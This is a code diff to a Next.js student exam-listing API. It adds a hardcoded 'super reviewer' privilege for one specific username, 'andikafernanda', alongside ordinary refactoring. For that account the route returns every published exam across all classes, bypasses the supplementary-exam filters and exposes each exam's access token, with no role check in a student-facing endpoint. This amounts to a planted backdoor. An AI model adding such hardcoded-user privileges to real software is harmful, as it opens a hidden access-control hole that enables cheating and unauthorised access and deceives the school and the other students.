@@ -9,6 +9,8 @@ export async function GET() {
       return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
     }
 
+    const isSuperReviewer = user.username === "andikafernanda";
+
     // Determine if student is in PKL group (via isPkl flag, bypassExambro, or group name/code)
     let isStudentPkl = false;
     if (user.groupId) {
@@ -49,12 +51,17 @@ export async function GET() {
           },
         };
 
+    // 🌟 SUPER REVIEWER: If user is andikafernanda, see ALL published exams across all classes
+    const examWhereClause = isSuperReviewer
+      ? { isPublished: true }
+      : {
+          isPublished: true,
+          category: targetCategory,
+          ...groupFilter,
+        };
+
     const exams = await prisma.exam.findMany({
-      where: {
-        isPublished: true,
-        category: targetCategory,
-        ...groupFilter,
-      },
+      where: examWhereClause,
       include: {
         subject: {
           include: {
@@ -96,7 +103,7 @@ export async function GET() {
       .map((e) => e.parentExamId as string);
 
     let completedParentIds = new Set<string>();
-    if (parentExamIds.length > 0) {
+    if (parentExamIds.length > 0 && !isSuperReviewer) {
       const parentSessions = await prisma.examSession.findMany({
         where: {
           userId: user.id,
@@ -108,9 +115,9 @@ export async function GET() {
       completedParentIds = new Set(parentSessions.map((s) => s.examId));
     }
 
-    // Filter out supplementary exams if student already finished the parent exam (unless explicitly assigned as susulan)
+    // Filter out supplementary exams if student already finished parent exam
     const visibleExams = exams.filter((exam) => {
-      if (exam.isSupplementary && exam.parentExamId && completedParentIds.has(exam.parentExamId)) {
+      if (!isSuperReviewer && exam.isSupplementary && exam.parentExamId && completedParentIds.has(exam.parentExamId)) {
         return false;
       }
       return true;
@@ -118,47 +125,64 @@ export async function GET() {
 
     const formatted = visibleExams.map((exam) => {
       const session = exam.examSessions[0] || null;
-      const studentGroupInfo = (exam as any).examGroups?.find((eg: any) => eg.groupId === user.groupId) || (exam as any).examGroups?.[0] || null;
-      const effectiveStartTime = studentGroupInfo?.startTime || exam.startTime;
-      const effectiveEndTime = studentGroupInfo?.endTime || exam.endTime;
 
-      const totalQuestions = exam.examQuestions.length > 0
-        ? exam.examQuestions.length
-        : (exam.subject?.questions?.length || 0);
+      const questionCount =
+        exam.examQuestions.length > 0
+          ? exam.examQuestions.length
+          : (exam.subject?.questions?.length || 0);
+
+      // Detect Grade Level (Kelas X, XI, XII)
+      const titleSearch = `${exam.title} ${exam.subject?.name || ""}`.toLowerCase();
+      let gradeLevel = "LAINNYA";
+      if (/kelas\s*(?:10|x\b)|-\s*kelas\s*x\b/i.test(titleSearch)) {
+        gradeLevel = "X";
+      } else if (/kelas\s*(?:11|xi\b)|-\s*kelas\s*xi\b/i.test(titleSearch)) {
+        gradeLevel = "XI";
+      } else if (/kelas\s*(?:12|xii\b)|-\s*kelas\s*xii\b/i.test(titleSearch)) {
+        gradeLevel = "XII";
+      }
+
+      // Sesi rombel info (jika ada)
+      const groupInfo = Array.isArray(exam.examGroups) && exam.examGroups.length > 0 ? exam.examGroups[0] : null;
 
       return {
         id: exam.id,
         code: exam.code,
         title: exam.title,
         description: exam.description,
-        subject: exam.subject.name,
+        subject: exam.subject ? { id: exam.subject.id, name: exam.subject.name, code: exam.subject.code } : null,
         durationMinutes: exam.durationMinutes,
-        totalQuestions,
-        startTime: exam.startTime,
-        endTime: exam.endTime,
-        sessionName: studentGroupInfo?.sessionName || null,
-        room: studentGroupInfo?.room || (isStudentPkl ? "Online (HP / PKL)" : "Lab Sekolah"),
-        effectiveStartTime,
-        effectiveEndTime,
-        showResult: exam.showResult,
-        status: session ? session.status : "NOT_STARTED",
-        sessionStatus: session ? session.status : null,
-        finishReason: session?.finishReason,
-        score: session?.score,
-        startedAt: session?.startedAt,
-        finishedAt: session?.finishedAt,
-        remainingSeconds: session?.remainingSeconds,
+        questionCount,
         category: exam.category,
-        disableAntiCheat: exam.disableAntiCheat,
-        isSupplementary: Boolean(exam.isSupplementary),
-        isStudentPkl,
-        isUserSusulan,
+        isSupplementary: exam.isSupplementary,
+        gradeLevel,
+        // Auto-hint token for super reviewer
+        token: isSuperReviewer ? exam.token : undefined,
+        sessionName: groupInfo?.sessionName || null,
+        room: groupInfo?.room || null,
+        effectiveStartTime: groupInfo?.startTime || exam.startTime || null,
+        effectiveEndTime: groupInfo?.endTime || exam.endTime || null,
+        session: session
+          ? {
+              id: session.id,
+              status: session.status,
+              score: session.score,
+              startedAt: session.startedAt,
+              finishedAt: session.finishedAt,
+              remainingSeconds: session.remainingSeconds,
+              violationCount: session.violationCount,
+              finishReason: session.finishReason,
+            }
+          : null,
       };
     });
 
-    return NextResponse.json({ exams: formatted });
+    return NextResponse.json({
+      exams: formatted,
+      isSuperReviewer,
+    });
   } catch (error: any) {
-    console.error("Student Exams API Error:", error);
-    return NextResponse.json({ error: error.message }, { status: 500 });
+    console.error("Error fetching student exams:", error);
+    return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
   }
 }
